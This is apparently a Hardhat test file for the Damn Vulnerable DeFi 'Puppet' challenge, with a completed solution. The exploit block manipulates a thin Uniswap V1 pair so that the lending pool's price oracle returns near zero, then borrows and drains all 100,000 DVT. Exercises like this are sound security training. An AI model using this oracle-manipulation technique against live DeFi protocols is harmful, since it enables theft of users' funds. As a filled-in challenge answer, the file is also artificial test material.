const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        /**
         * Starting with a Uniswap V1 pool, placed 10ETH/10DVT.=> 1 ETH = 1 DVT.
         * 
         * Scenario:
         *  -> Price of the token is calculated in wei, given as:
         *       ETH balance of the pool / DVT balance of the pool
         *  -> As attacker, we have 1k DVT tokens and 25 ETH. Our aim is minimizing the
         *  value returned from the _computeOraclePrice(), either infimum of 0 or such a value that 
         *  can be ignored.(Epsilon)
         *  -> Drain the uniswap pair by swapping 10 - E,E is Epsilon, DVT to ETH. Now pair has balances that will yield fail during the calculation of oracle price(More DVT tokens than ETH).
         *  -> Explaination about the oracle distruption:
         *  -> uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
         *     ^^^^^(1)^^^^^^^^^^^                ^^^^^^^^^^^^^^(2)^^^^^^^^^^^
         *  -> Since the oracle uses integer division, at the moment where (2) > (1), oracle will
         *  return 0. 
         *  Read this also:https://hackmd.io/@HaydenAdams/HJ9jLsfTz
         *  HOW:https://docs.uniswap.org/protocol/V1/reference/interfaces, call tokenToEthSwap.
         *  -> Oracle returns 0 as DVT price.
         *  -> Drain all the funds in the pool by calling borrow.
         * 
         */
        
        //approve for arbitrary amount.
        //approve less than the initial balance so that at the end 
        //we will have more funds than the pool.
        const attackAmount = ATTACKER_INITIAL_TOKEN_BALANCE.sub(10000);
        await this.token.connect(attacker).approve(this.uniswapExchange.address,attackAmount);

        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
            attackAmount,
            1,
            (await ethers.provider.getBlock('latest')).timestamp + 10 //also completely arbitrary.
        );

        const sendCollateral = await this.lendingPool.connect(attacker).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)

        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,{value:sendCollateral});
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});